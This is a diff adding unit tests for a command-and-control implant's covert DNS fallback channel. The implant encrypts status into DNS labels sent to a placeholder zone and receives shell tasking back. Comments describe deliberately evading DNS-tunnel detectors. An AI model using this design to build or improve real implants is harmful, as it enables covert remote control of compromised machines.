@@ -342,5 +342,254 @@ class TestTheBeaconsCopyOfTheFormat(unittest.TestCase):
         self.assertEqual(beacon_mod._RESCUE_VERSION, dns_rescue.VERSION)
         self.assertEqual(beacon_mod._RESCUE_TRANSPORTS, dns_rescue.TRANSPORTS)
 
-if __name__ == "__main__":
-    unittest.main()
+# ── The trigger and the query (Task 3) ──
+
+
+class _Sent:
+    """Records every TXT query the beacon makes, and answers with nothing."""
+
+    def __init__(self, answer=None):
+        self.names = []
+        self._answer = answer
+
+    def __call__(self, name, qtype, server, timeout=10):
+        self.names.append(name)
+        return [self._answer] if self._answer else []
+
+
+def _rescue_beacon(zone="rescue.example"):
+    return _a_beacon(dns={"enabled": True, "domain": zone,
+                          "resolver": "127.0.0.1"})
+
+
+class TestTheTrigger(unittest.TestCase):
+    def _exhausted(self, beacon):
+        """What the loop's `tasking is None` arm sees after a dead cycle."""
+        beacon._start_cycle()
+        beacon._record_leg("https", dns_rescue.CLASSES["auth_required"], 407)
+        beacon._rescue_flags |= dns_rescue.FLAG_DNS_ANSWERED
+        beacon._record_leg("dns", dns_rescue.CLASSES["answered"])
+        beacon._record_leg("smb", dns_rescue.CLASSES["unreachable"])
+        beacon._record_leg("quic", dns_rescue.CLASSES["timed_out"])
+
+    def test_a_rescue_goes_out_when_nothing_delivered_and_dns_answered(self):
+        beacon = _rescue_beacon()
+        self._exhausted(beacon)
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        self.assertEqual(len(sent.names), 1)
+        labels = sent.names[0].split(".")
+        # <p1>.<p2>.<base32(id)>.r.<zone>
+        self.assertEqual(labels[3], dns_rescue.MARKER)
+        self.assertEqual(".".join(labels[4:]), "rescue.example")
+        for label in labels[:3]:
+            self.assertRegex(label, r"\A[a-z2-7]+\Z")
+            self.assertLessEqual(len(label), 63)
+        self.assertEqual(len(labels[0]) + len(labels[1]),
+                         dns_rescue.PAYLOAD_CHARS)
+        self.assertLessEqual(len(sent.names[0]), 253)
+
+    def test_the_payload_decrypts_back_to_what_the_legs_recorded(self):
+        beacon = _rescue_beacon()
+        self._exhausted(beacon)
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        one, two = sent.names[0].split(".")[:2]
+        wrapper = beacon._decrypt(dns_rescue.from_labels(one, two))
+        got = dns_rescue.unpack(base64.b64decode(wrapper["d"]))
+        self.assertEqual(got["https"],
+                         (dns_rescue.CLASSES["auth_required"], 407))
+        self.assertEqual(got["dns"], (dns_rescue.CLASSES["answered"], 0))
+        self.assertTrue(got["flags"] & dns_rescue.FLAG_DNS_ANSWERED)
+
+    def test_no_rescue_when_the_resolver_did_not_answer(self):
+        # The case the next project exists for: nothing can leave, so
+        # sending would be noise with no recipient.
+        beacon = _rescue_beacon()
+        beacon._start_cycle()
+        beacon._record_leg("dns", dns_rescue.CLASSES["resolve_failed"])
+        beacon._record_leg("https", dns_rescue.CLASSES["unreachable"])
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        self.assertEqual(sent.names, [])
+
+    def test_no_rescue_when_dns_is_not_configured(self):
+        beacon = _a_beacon()
+        self._exhausted(beacon)
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        self.assertEqual(sent.names, [])
+
+    def test_only_one_rescue_per_exhaustion(self):
+        # Rate is the one thing a tunnel detector reliably finds, and a
+        # latch has no rate.
+        beacon = _rescue_beacon()
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            for _ in range(20):
+                self._exhausted(beacon)
+                beacon._maybe_rescue()
+        self.assertEqual(len(sent.names), 1)
+
+    def test_the_latch_clears_when_a_leg_recovers(self):
+        beacon = _rescue_beacon()
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            self._exhausted(beacon)
+            beacon._maybe_rescue()
+            beacon._leg_recovered()
+            self._exhausted(beacon)
+            beacon._maybe_rescue()
+        self.assertEqual(len(sent.names), 2)
+
+    def test_a_name_over_253_characters_is_not_sent(self):
+        # Not truncated: a truncated record decrypts to nothing and would
+        # be indistinguishable, at the server, from an attacker's noise.
+        beacon = _rescue_beacon(zone=("z" * 60 + ".") * 3 + "example")
+        self._exhausted(beacon)
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        self.assertEqual(sent.names, [])
+
+    def test_the_record_carries_no_hostname_or_credential(self):
+        beacon = _rescue_beacon()
+        self._exhausted(beacon)
+        sent = _Sent()
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query", sent):
+            beacon._maybe_rescue()
+        one, two = sent.names[0].split(".")[:2]
+        raw = base64.b64decode(
+            beacon._decrypt(dns_rescue.from_labels(one, two))["d"])
+        self.assertEqual(len(raw), dns_rescue.RECORD_BYTES)
+        for secret in (b"rescue.example", b"127.0.0.1", _KEY,
+                       beacon._implant_id.encode()):
+            with self.subTest(secret=secret[:12]):
+                self.assertNotIn(secret, raw)
+
+    def test_an_answer_to_the_rescue_is_returned_as_tasking(self):
+        # One query, not two: the rescue reports and collects the next
+        # instruction in the same exchange.
+        beacon = _rescue_beacon()
+        self._exhausted(beacon)
+        task = beacon._encrypt({"cmd": "shell id"})
+        with unittest.mock.patch.object(
+                sys.modules["software.c2.beacon"], "_dns_query",
+                _Sent(answer=task)):
+            got = beacon._maybe_rescue()
+        self.assertEqual(got, {"cmd": "shell id"})
+
+
+class TestTheCopyBehavesLikeTheModule(unittest.TestCase):
+    """Constants matching is necessary and not sufficient.
+
+    The guarantee that matters is that both sides produce the same bytes
+    and the same labels, so this drives the two codecs against each other.
+    """
+
+    def test_both_sides_pack_the_same_bytes(self):
+        from software.c2 import beacon as beacon_mod
+
+        legs = {"https": (dns_rescue.CLASSES["auth_required"], 407),
+                "dns": (dns_rescue.CLASSES["answered"], 0),
+                "quic": (dns_rescue.CLASSES["timed_out"], 65535)}
+        flags = dns_rescue.FLAG_PROXY_FOUND | dns_rescue.FLAG_DNS_ANSWERED
+        self.assertEqual(beacon_mod._rescue_pack(legs, flags),
+                         dns_rescue.pack(legs, flags))
+
+    def test_both_sides_split_into_the_same_labels(self):
+        from software.c2 import beacon as beacon_mod
+
+        cipher = _a_ciphertext()
+        self.assertEqual(beacon_mod._rescue_to_labels(cipher),
+                         dns_rescue.to_labels(cipher))
+
+    def test_the_beacon_clamps_where_the_module_raises(self):
+        # Deliberate asymmetry: the implant must never crash on the path
+        # that explains why it is stuck; the server validates what arrives.
+        from software.c2 import beacon as beacon_mod
+
+        over = {"https": (dns_rescue.CLASSES["http_status"], 70000)}
+        self.assertEqual(len(beacon_mod._rescue_pack(over, 0)),
+                         dns_rescue.RECORD_BYTES)
+        with self.assertRaises(ValueError):
+            dns_rescue.pack(over, 0)
+
+
+class TestTheLoopIsWired(unittest.TestCase):
+    """The methods above are only a feature if the loop calls them."""
+
+    def _run_cycles(self, beacon, cycles, dns_answers=None,
+                    rescue_answer=None):
+        """Drive the real `_beacon_loop` for a fixed number of cycles."""
+        state = {"n": 0}
+
+        def stop_after(*a, **kw):
+            state["n"] += 1
+            if state["n"] >= cycles:
+                beacon._running = False
+
+        sent = _Sent()
+
+        def query(name, qtype, server, timeout=10):
+            if "." + dns_rescue.MARKER + "." in name:
+                sent(name, qtype, server, timeout)
+                return [rescue_answer] if rescue_answer else []
+            # The ordinary tasking query: the resolver answers, with
+            # nothing queued.
+            return list(dns_answers or [])
+
+        beacon._running = True
+        with unittest.mock.patch.object(beacon, "_jittered_sleep", stop_after), \
+             unittest.mock.patch.object(beacon, "_backoff_sleep", stop_after), \
+             unittest.mock.patch.object(
+                 sys.modules["software.c2.beacon"], "_dns_query", query):
+            beacon._beacon_loop()
+        return sent.names
+
+    def test_one_dead_cycle_sends_one_rescue(self):
+        beacon = _rescue_beacon()
+        names = self._run_cycles(beacon, 1)
+        self.assertEqual(len(names), 1)
+        self.assertIn("." + dns_rescue.MARKER + ".", names[0])
+
+    def test_twenty_dead_cycles_still_send_one(self):
+        # The latch, through the real loop rather than by calling
+        # _maybe_rescue directly.
+        beacon = _rescue_beacon()
+        names = self._run_cycles(beacon, 20)
+        self.assertEqual(len(names), 1)
+
+    def test_the_loop_actually_runs_what_the_rescue_brought_back(self):
+        # The rescue collecting tasking is worth nothing if the loop then
+        # drops it, which is exactly what assigning inside the
+        # `tasking is None` arm does: the `elif` that dispatches never runs.
+        beacon = _rescue_beacon()
+        ran = []
+        with unittest.mock.patch.object(
+                beacon, "_process_tasking_batch", ran.append):
+            self._run_cycles(beacon, 1,
+                             rescue_answer=beacon._encrypt({"cmd": "shell id"}))
+        self.assertEqual(ran, [{"cmd": "shell id"}])
+
+    def test_the_loop_clears_the_accumulator_between_cycles(self):
+        beacon = _rescue_beacon()
+        self._run_cycles(beacon, 3)
+        # After the last cycle only this cycle's legs are present: https
+        # and smb were never enabled, so they must read as not attempted.
+        self.assertNotIn("https", beacon._leg_status)
+        self.assertNotIn("smb", beacon._leg_status)
+        self.assertEqual(beacon._leg_status["dns"],
+                         (dns_rescue.CLASSES["answered"], 0))
